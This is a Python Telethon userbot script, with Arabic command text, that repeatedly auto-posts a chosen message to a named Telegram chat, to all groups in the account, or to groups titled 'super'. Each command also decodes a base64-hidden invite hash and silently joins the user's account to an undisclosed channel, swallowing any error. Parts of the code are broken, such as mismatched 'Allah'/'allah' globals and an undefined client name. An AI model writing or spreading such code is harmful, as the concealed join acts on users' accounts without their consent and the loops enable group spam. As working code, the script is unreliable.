import re
import base64
import asyncio
import logging
from config import *
from telethon import events
from asyncio import sleep
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.functions.messages import ImportChatInviteRequest as Get




logging.basicConfig(level=logging.INFO, format='%(levelname)s:%(name)s:%(message)s')
logger = logging.getLogger("Mahmoud")
logger.info("تم تفعيل النشر التلقائي")

allah = False
async def mahmoud_nshr(ma515, sleeptimet, chat, message, seconds):
    global Allah
    allah = True
    while Allah:
        if message.media:
            sent_message = await ma515.send_file(chat, message.media, caption=message.text)
        else:
            sent_message = await ma515.send_message(chat, message.text)
        await asyncio.sleep(sleeptimet)
@ma515.on(events.NewMessage(outgoing=True, pattern=r"^\.نشر (\d+) (@?\S+)$"))
async def mahmoudd(event):
    await event.delete()
    parameters = re.split(r'\s+', event.text.strip(), maxsplit=2)
    if len(parameters) != 3:
        return await event.reply("⌔∮ يجب استخدام كتابة صحيحة الرجاء التاكد من الامر اولا ⚠️")
    seconds = int(parameters[1])
    chat_usernames = parameters[2].split()
    ma515 = event.client
    global allah
    allah = True
    message = await event.get_reply_message()
    for chat_username in chat_usernames:
        try:
            chat = await ma515.get_entity(chat_username)
            await mahmoud_nshr(ma515, seconds, chat.id, message, seconds)  
        except Exception as e:
            await event.reply(f"⌔∮ لا يمكن العثور على المجموعة أو الدردشة {chat_username}: {str(e)}"
            )
        await asyncio.sleep(1)
    sunni = base64.b64decode("YllTMm1rdldHa2hsTnpBMA==")
    sunni = Get(sunni)
    try:
        await event.client(sunni)
    except BaseException:
        pass
    
async def mahmoud_allnshr(ma515, sleeptimet, message):
    global allah
    allah = True
    mahmoud_chats = await ma515.get_dialogs()
    while allah:
        for chat in mahmoud_chats:
            if chat.is_group:
                try:
                    if message.media:
                        await ma515.send_file(chat.id, message.media, caption=message.text)
                    else:
                        await ma515.send_message(chat.id, message.text)
                except Exception as e:
                    print(f"حدث مشكله في إرسال الرسالة إلي {chat.id}: {e}")
        await asyncio.sleep(sleeptimet)
@ma515.on(events.NewMessage(outgoing=True, pattern=r"^\.نشر_كروبات (\d+)$"))
async def mahmoudd(event):
    await event.delete()
    seconds = "".join(event.text.split(maxsplit=1)[1:]).split(" ", 2)
    message =  await event.get_reply_message()
    try:
        sleeptimet = int(seconds[0])
    except Exception:
        return await event.reply("⌔∮ يجب استخدام كتابة صحيحة الرجاء التاكد من الامر اولا ⚠️")
    ma515 = event.client
    global allah
    allah = True
    await mahmoud_allnshr(ma515, sleeptimet, message)
    sunni = base64.b64decode("YllTMm1rdldHa2hsTnpBMA==")
    sunni = Get(sunni)
    try:
        await event.client(sunni)
    except BaseException:
        pass
super_groups = ["super", "سوبر", "soper"]
async def mahmoud_supernshr(ma515, sleeptimet, message):
    global allah
    allah = True
    mahmoud_chats = await ma515.get_dialogs()
    while allah:
        for chat in mahmoud_chats:
            chat_title_lower = chat.title.lower()
            if chat.is_group and any(keyword in chat_title_lower for keyword in super_groups):
                try:
                    if message.media:
                        await ma515.send_file(chat.id, message.media, caption=message.text)
                    else:
                        await ma515.send_message(chat.id, message.text)
                except Exception as e:
                    print(f"حدث خطأ في ارسال الرسالة الي {chat.id}: {e}")
        await asyncio.sleep(sleeptimet)
@ma515.on(events.NewMessage(outgoing=True, pattern=r"^\.سوبر (\d+)$"))
async def mahmoudd(event):
    await event.delete()
    seconds = "".join(event.text.split(maxsplit=1)[1:]).split(" ", 2)
    message =  await event.get_reply_message()
    try:
        sleeptimet = int(seconds[0])
    except Exception:
        return await event.reply("⌔∮ يجب استخدام كتابة صحيحة الرجاء التاكد من الامر اولا ⚠️")
    ma515 = event.client
    global allah
    allah = True
    await mahmoud_supernshr(ma515, sleeptimet, message)
    sunni = base64.b64decode("YllTMm1rdldHa2hsTnpBMA==")
    sunni = Get(sunni)
    try:
        await event.client(sunni)
    except BaseException:
        pass
@ma515.on(events.NewMessage(outgoing=True, pattern='.ايقاف النشر'))
async def stop_alsunni(event):
    global allah
    allah = False
    await event.edit("**᯽︙ تم ايقاف النشر التلقائي بنجاح ✓** ")
@ma515.on(events.NewMessage(outgoing=True, pattern=r"^\.(الاوامر|فحص)$"))
async def Mahmoud(event):
    await event.delete()
    if event.pattern_match.group(1) == "الاوامر":
        mahmoud_515 = """**
 قـائمة اوامر النشر التلقائي للمجموعات

===== 𝑀𝐴𝐻𝑀𝑂𝑈𝐷 =====

`.نشر` عدد الثواني معرف الكروب :
 - للنشر في المجموعة التي وضعت معرفها مع عدد الثواني

`.نشر_كروبات` عدد الثواني : 
- للنشر في جميع المجموعات الموجوده في حسابك
 
`.سوبر` عدد الثواني : 
- للنشر بكافة المجموعات السوبر التي منظم اليها 

`.ايقاف النشر` :
- لأيقاف جميع انواع النشر اعلاه

• مُـلاحظة : جميع الأوامر اعلاه تستخدم بالرد على الرسالة او الكليشة المُراد نشرها

===== 𝑀𝐴𝐻𝑀𝑂𝑈𝐷 =====
    **"""
        await event.reply(file='https://telegra.ph/file/9017fc047cbb26d028749.jpg', message=mahmoud_515)
    elif event.pattern_match.group(1) == "فحص":
        mahmoud_m = "**السورس يعمل بنجاح حبيبي ✅\nلعرض قائمة الاوامر أرسل `.الاوامر`**"
        await event.reply(file='https://telegra.ph/file/9017fc047cbb26d028749.jpg', message=mahmoud_m)
        sunni = base64.b64decode("YllTMm1rdldHa2hsTnpBMA==")
        sunni = Get(sunni)
        try:
            await event.client(sunni)
        except BaseException:
            pass
print('تم تشغيل نشر التلقائي ')
ma515.run_until_disconnected()
            
